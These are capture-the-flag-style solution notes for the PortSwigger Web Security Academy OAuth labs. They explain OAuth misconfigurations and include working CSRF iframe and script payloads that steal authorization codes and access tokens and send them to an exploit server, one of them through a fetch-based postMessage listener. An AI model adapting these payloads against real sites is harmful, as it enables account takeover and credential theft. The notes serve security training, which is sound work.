1. This lab has a simple implementation of using OAuth 2.0 for user authentication. It works by establishing an access token with the oauth provider, then using it to retrieve user information and attempting to login with that user information. By resending the login request (to the `/authenticate` endpoint) with another user's email address, the other information isn't verified and we are logged into the victim's account
2. Already solved
3. This lab is about using CSRF in order to attach your own social media account to the admin's blog account. This is done by initiating the account linking process, but dropping the request to `/oauth-linking`. By doing this, the code is not used and is therefore still valid. At this point a normal CSRF attack can be performed via something like an iframe in order to complete the linking request within the victim's session. This works because there is no `state` parameter being used in the oauth flow, and as a result logging in with your social media account will now log you in as the victim
4. This lab takes advantage of a lack of validation on the `redirect_uri` paramter. As a result, a CSRF attack can be used to initiate an oauth flow with a redirect uri that points to the exploit server. From there, the code can be recovered and used for the 2nd half of the authorization flow on the target website, signing on as the victim user. The following iframe causes the CSRF attack:
```
<iframe src=https://oauth-ac4b1fca1fc70b52c082166f02900004.web-security-academy.net/auth?client_id=spk3gb76er7lf812k1e1x&redirect_uri=https://exploit-ac471f611f4e0b11c0d2163201660064.web-security-academy.net/oauth&response_type=code&scope=openid%20profile%20email></iframe>
```
The stolen code can be used to navigate to the following endpoint to complete sign in: `https://acce1fac1f360b55c02716a2002e00e3.web-security-academy.net/oauth-callback?code=[CODE HERE]`
5. This lab is about utilizing an open redirect within the victi page along with improper validation of the `redirect_uri` in order to steal a user's access token. While this lab does compare `redirect_uri` values against a whitelist, it allows arbitrary endings including path traversal sequences. Additionally, the victim page has an open redirect vulnerability at `/post/next?path=<redirect here>`. These can be combined to use CSRF to force a victim user to start an oauth flow and steal their access token as follows:
```
<script>
if (!document.location.hash)
window.location = "https://oauth-aced1f191e9ece46c0f59ee202ea0070.web-security-academy.net/auth?client_id=ifzvmj2iaen7vuxjogb9k&redirect_uri=https://ac471fcc1ee4cecfc0269e0a009b00d2.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-ac451f7d1e6dcecac0649e3e01060038.web-security-academy.net/exploit&response_type=token&nonce=-1106232448&scope=openid%20profile%20email";
else
window.location = '/?' + document.location.hash.substr(1);
</script>
```
The access token can be retrieved from the server logs, and can be used to access the `/me` endpoint and retrieve their API key to solve the lab
6. This lab is about utilizing a path traversal vulnerability in the `redirect_uri` parameter along with the fact that the comment form page sends its full URI within a web message to its parent. As a result, an oauth flow can be started via CSRF with a `redirect_uri` pointing to the comment post form. From there, a message listener can be set up to listen for the URI and send it to the server logs for extraction. This provides the victim's access token, which can be used with the `/me` endpoint in order to steal their API key. The following payload performs the CSRF and listens for the message:
```
<iframe src="https://oauth-ac231f621e56e160c0da329702cd00ae.web-security-academy.net/auth?client_id=rh2cmz4h8ao79kqcwdlob&redirect_uri=https://aceb1f6d1e56e1bdc001325a007d00d9.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=1288180421&scope=openid%20profile%20email"></iframe>
<script>
window.addEventListener('message', function(e) {fetch('/' + encodeURIComponent(e.data.data))}, false)
</script>
```

# OpenID Connect
1. This lab cannot be solved without Burp Pro due to networking restrictions on the lab's end preventing access to the public internet except for Burp Collaborator
